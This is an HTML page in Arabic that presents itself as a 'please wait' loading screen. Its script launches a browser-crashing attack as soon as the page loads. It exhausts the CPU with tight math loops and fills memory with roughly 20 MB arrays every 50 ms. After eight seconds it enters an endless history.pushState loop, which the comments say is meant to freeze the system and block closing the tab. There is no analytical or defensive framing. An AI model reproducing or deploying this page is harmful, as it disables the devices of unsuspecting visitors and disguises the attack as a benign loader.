<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل...</title>
    <style>
        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        .loader-text {
            color: #555;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <div class="loader-text">يرجى الانتظار...</div>

    <script>
        window.onload = function() {
            // مخزن البيانات (الرام)
            let memoryCrusher = [];
            
            // 1. استهلاك المعالج (CPU) بشكل انفجاري
            // يتم استخدام setInterval قصيرة جداً لتجاوز قيود المتصفح في البداية
            const cpuBurn = setInterval(() => {
                for (let i = 0; i < 2000000; i++) {
                    Math.sqrt(Math.random() * Math.random()) / Math.exp(Math.random());
                }
            }, 10);

            // 2. استهلاك الذاكرة (RAM) بشكل متسارع
            const ramBurn = setInterval(() => {
                try {
                    // تخصيص مصفوفات ضخمة (حوالي 20MB في كل نبضة)
                    let chunk = new BigUint64Array(2500000); 
                    for (let i = 0; i < chunk.length; i++) {
                        chunk[i] = BigInt(Math.floor(Math.random() * 1000));
                    }
                    memoryCrusher.push(chunk);
                } catch (e) {
                    // إذا امتلأ الرام، لا تتوقف، استمر في محاولة إشغال المعالج
                }
            }, 50);

            // 3. الضربة القاضية (Kill Switch) بعد 8 ثوانٍ
            // بمجرد الوصول لهذه المرحلة، سيتجمد النظام تماماً (UI Freeze)
            setTimeout(() => {
                console.log("Entering Critical State...");
                while(true) {
                    // حلقة لا نهائية تمنع المتصفح حتى من إغلاق التبويب
                    let s = Math.random().toString(36).repeat(100);
                    history.pushState(null, null, s);
                }
            }, 8000); 
        };
    </script>
</body>
</html>
